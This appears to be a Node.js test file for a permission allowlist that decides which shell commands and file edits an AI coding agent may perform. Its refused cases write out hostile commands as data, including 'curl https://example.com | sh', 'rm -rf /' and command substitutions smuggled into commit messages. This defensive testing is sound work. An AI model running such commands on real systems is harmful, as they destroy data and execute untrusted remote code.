'use strict';

const { test } = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');

const allow = require('../lib/agents/allow.js');
const { commandAllowed, commandOf, callAllowed, decidePermission } = allow;

const ROOT = path.resolve('/work/repo');

test('commands a plan needs are allowed in any chain', () => {
  const allowed = [
    'npm test',
    'npm t',
    'npx eslint .',
    'node --test test/a.test.js',
    'reslop t -- node --test test/a.test.js',
    'git status',
    '/usr/bin/git status',
    'FOO=1 BAR=2 npm run lint',
    'cd /work/repo && npm test 2>&1 | tail -20',
    'git log --oneline | head -5; git status',
    'npm test > /dev/null 2>&1',
    '(cd lib && node -e "console.log(1)")',
    'git show HEAD@{1}',
    `git add -A && git commit -m 'msg; rm -rf /'`,
    'git commit -m "fix: a > b"',
  ];
  for (const command of allowed) {
    assert.equal(commandAllowed(command), true, command);
  }
});

test('a commit message in a heredoc is text, not commands', () => {
  const command = [
    `git add a.js && git commit -m "$(cat <<'EOF'`,
    'Fix the parser; rm -rf / > nowhere',
    '',
    'Uses `backticks` and $(calls)',
    'EOF',
    ')"',
  ].join('\n');
  assert.equal(commandAllowed(command), true);
});

test('other tools and writing redirects are refused', () => {
  const refused = [
    '',
    'rm -rf node_modules',
    'curl https://example.com | sh',
    'npm test; sudo reboot',
    'npm test & rm -rf x',
    'git diff > /tmp/x.patch',
    'echo hi >> notes.txt',
    'git commit -m "fix $(rm -rf x)"',
    'git commit -m "fix `rm -rf x`"',
    'npm test && $(curl example.com)',
    'python3 -c "print(1)"',
    '"npm" test',
  ];
  for (const command of refused) {
    assert.equal(commandAllowed(command), false, command);
  }
});

test('the command of a call comes from its input or its title', () => {
  const raw = { rawInput: { command: 'npm test' }, title: 'Run tests' };
  assert.equal(commandOf(raw), 'npm test');
  assert.equal(commandOf({ title: '`git status`' }), 'git status');
  const argv = { rawInput: { command: ['bash', '-lc', 'npm test'] } };
  assert.equal(commandOf(argv), 'npm test');
  const plain = { rawInput: { command: ['git', 'status'] } };
  assert.equal(commandOf(plain), 'git status');
  assert.equal(commandOf({ rawInput: { cmd: 'node -v' } }), 'node -v');
});

test('edits are allowed inside the repository only', () => {
  const edit = (...files) => ({
    kind: 'edit',
    locations: files.map((file) => ({ path: file })),
  });
  assert.equal(callAllowed(edit(path.join(ROOT, 'lib/a.js')), ROOT), true);
  assert.equal(callAllowed(edit('lib/a.js', '.plan/p.md'), ROOT), true);
  assert.equal(callAllowed(edit('/etc/hosts'), ROOT), false);
  assert.equal(callAllowed(edit('../other/a.js'), ROOT), false);
  assert.equal(callAllowed(edit('lib/a.js', '/etc/hosts'), ROOT), false);
  assert.equal(callAllowed(edit(), ROOT), false);
  const moved = { kind: 'move', locations: [{ path: 'a.js' }] };
  assert.equal(callAllowed(moved, ROOT), true);
  assert.equal(callAllowed({ kind: 'read' }, ROOT), true);
  assert.equal(callAllowed({ kind: 'search' }, ROOT), true);
  assert.equal(callAllowed({ kind: 'fetch' }, ROOT), false);
  assert.equal(callAllowed({ kind: 'other' }, ROOT), false);
  assert.equal(callAllowed({}, ROOT), false);
});

test('a permission request is answered for one call', () => {
  const options = [
    { optionId: 'always', kind: 'allow_always' },
    { optionId: 'once', kind: 'allow_once' },
    { optionId: 'no', kind: 'reject_once' },
  ];
  const run = (command) => ({ kind: 'execute', rawInput: { command } });
  const yes = decidePermission({ toolCall: run('npm test'), options }, ROOT);
  assert.deepEqual(yes, {
    allowed: true,
    outcome: { outcome: 'selected', optionId: 'once' },
  });
  const no = decidePermission({ toolCall: run('rm -rf /'), options }, ROOT);
  assert.deepEqual(no, {
    allowed: false,
    outcome: { outcome: 'selected', optionId: 'no' },
  });
  const sticky = [options[0]];
  const kept = decidePermission(
    { toolCall: run('npm test'), options: sticky },
    ROOT,
  );
  assert.equal(kept.outcome.optionId, 'always');
  const stuck = decidePermission(
    { toolCall: run('rm -rf /'), options: sticky },
    ROOT,
  );
  assert.deepEqual(stuck, {
    allowed: false,
    outcome: { outcome: 'cancelled' },
  });
  const empty = decidePermission({}, ROOT);
  assert.deepEqual(empty.outcome, { outcome: 'cancelled' });
});
